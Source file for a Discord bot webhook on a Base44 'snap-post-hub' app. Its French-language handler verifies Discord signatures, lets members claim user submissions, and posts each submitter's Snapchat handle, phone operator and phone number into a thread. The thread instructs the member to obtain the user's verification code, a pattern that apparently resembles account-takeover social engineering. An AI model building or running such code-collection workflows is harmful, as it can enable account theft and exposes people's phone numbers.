import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const BOT_TOKEN = Deno.env.get('DISCORD_BOT_TOKEN');
const CHANNEL_ID = Deno.env.get('DISCORD_CHANNEL_ID');
const PUBLIC_KEY = Deno.env.get('DISCORD_PUBLIC_KEY');

// Vérifier la signature Discord
async function verifyDiscordSignature(req: Request, body: string): Promise<boolean> {
  const signature = req.headers.get('x-signature-ed25519') || '';
  const timestamp = req.headers.get('x-signature-timestamp') || '';
  
  if (!signature || !timestamp) return false;
  
  const message = timestamp + body;
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  const keyData = await crypto.subtle.importKey(
    'raw',
    Uint8Array.from(Buffer.from(PUBLIC_KEY, 'hex')),
    { name: 'Ed25519', namedCurve: 'Ed25519' },
    false,
    ['verify']
  );
  
  try {
    return await crypto.subtle.verify(
      'Ed25519',
      keyData,
      Uint8Array.from(Buffer.from(signature, 'hex')),
      data
    );
  } catch {
    return false;
  }
}

Deno.serve(async (req) => {
  if (req.method !== 'POST') {
    return Response.json({ error: 'Method not allowed' }, { status: 405 });
  }

  try {
    const body = await req.text();
    const isValid = await verifyDiscordSignature(req, body);
    
    if (!isValid) {
      return Response.json({ error: 'Invalid signature' }, { status: 401 });
    }

    const interaction = JSON.parse(body);

    // PING
    if (interaction.type === 1) {
      return Response.json({ type: 1 });
    }

    // MESSAGE_COMPONENT (réaction)
    if (interaction.type === 3) {
      const userId = interaction.member.user.id;
      
      // Extraire l'ID de la soumission et le snapchat
      const messageEmbed = interaction.message?.embeds?.[0];
      const submissionId = messageEmbed?.footer?.text?.match(/ID: ([a-z0-9]+)/)?.[1];
      const snapchat = messageEmbed?.fields?.find((f: any) => f.name === '👻 Utilisateur')?.value?.replace('@', '') || 'Utilisateur';
      
      if (!submissionId) {
        return Response.json({ type: 4, data: { content: '❌ Impossible de trouver la soumission' } });
      }

      const base44 = createClientFromRequest(req);
      const submission = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);
      
      if (!submission) {
        return Response.json({ type: 4, data: { content: '❌ Soumission non trouvée' } });
      }

      // Répondre immédiatement à l'interaction
      const responseData = {
        type: 4,
        data: {
          content: '⏳ Création du thread...'
        }
      };

      // Générer un code aléatoire de 6 caractères
      const code = Math.random().toString(36).substring(2, 8).toUpperCase();

      // Mettre à jour la soumission avec le code et l'ID du réacteur
      await base44.asServiceRole.entities.Submission.update(submissionId, { code, status: 'code_ready', discord_user_id: userId });

      // Créer un thread sur le message
      const threadResponse = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages/${interaction.message.id}/threads`, {
        method: 'POST',
        headers: {
          'Authorization': `Bot ${BOT_TOKEN}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          name: `✅ Prise en charge — @${snapchat}`,
          auto_archive_duration: 1440
        })
      });

      if (threadResponse.ok) {
        const thread = await threadResponse.json();
        const threadId = thread.id;

        // Ajouter l'utilisateur au thread
        await fetch(`https://discord.com/api/v10/channels/${threadId}/thread_members/${userId}`, {
          method: 'PUT',
          headers: { 'Authorization': `Bot ${BOT_TOKEN}` }
        });

        // Envoyer le message avec les infos dans le thread
        const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
        const triggerUrl = `${appUrl}/?trigger=${submissionId}`;

        const embed = {
          title: "✅ Tu as pris en charge cette soumission",
          color: 3447003,
          fields: [
            { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
            { name: "📡 Opérateur", value: submission.operateur, inline: true },
            { name: "📞 Numéro", value: submission.telephone, inline: true },
            { name: "🔑 Code", value: `\`${code}\``, inline: false },
            {
              name: "📝 Instructions",
              value: `Envoie le code à l'utilisateur et attends qu'il te donne son code de vérification.\n\n[Cliquer ici pour envoyer le code](${triggerUrl})`,
              inline: false
            }
          ]
        };

        await fetch(`https://discord.com/api/v10/channels/${threadId}/messages`, {
          method: 'POST',
          headers: {
            'Authorization': `Bot ${BOT_TOKEN}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ embeds: [embed] })
        });

        // Modifier la réponse pour dire que c'est fait
        responseData.data.content = `✅ Thread créé! <#${threadId}>`;
      } else {
        responseData.data.content = '❌ Erreur création du thread';
      }

      return Response.json(responseData);
    }

    return Response.json({ type: 4, data: { content: 'Interaction non supportée' } });
  } catch (error) {
    console.error('Erreur:', error);
    return Response.json({ error: error.message }, { status: 500 });
  }
});